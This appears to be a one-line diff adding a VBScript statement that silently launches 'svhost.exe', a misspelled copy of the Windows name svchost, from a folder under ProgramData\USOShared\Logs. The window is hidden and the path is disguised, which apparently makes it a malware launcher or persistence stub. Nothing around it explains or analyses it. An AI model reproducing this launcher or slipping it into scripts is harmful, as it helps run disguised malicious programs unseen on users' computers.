@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "C:\ProgramData\USOShared\Logs\User\eater_vf\svhost.exe", 0
